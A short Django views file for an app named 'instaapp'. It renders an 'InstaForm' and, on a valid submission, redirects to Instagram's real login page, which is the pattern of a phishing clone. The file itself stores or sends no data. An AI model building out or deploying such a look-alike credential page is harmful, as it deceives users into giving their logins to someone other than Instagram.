from .forms import InstaForm
from django.shortcuts import render, redirect

# Create your views here.

from django.http import HttpResponse


def index(request):
    form = InstaForm()
    if request.method == "POST":
        form = InstaForm(request.POST)
        if form.is_valid():
            return redirect('https://www.instagram.com/accounts/login/')

    context = {'form': form}
    return render(request, 'instaapp/index.html', context)
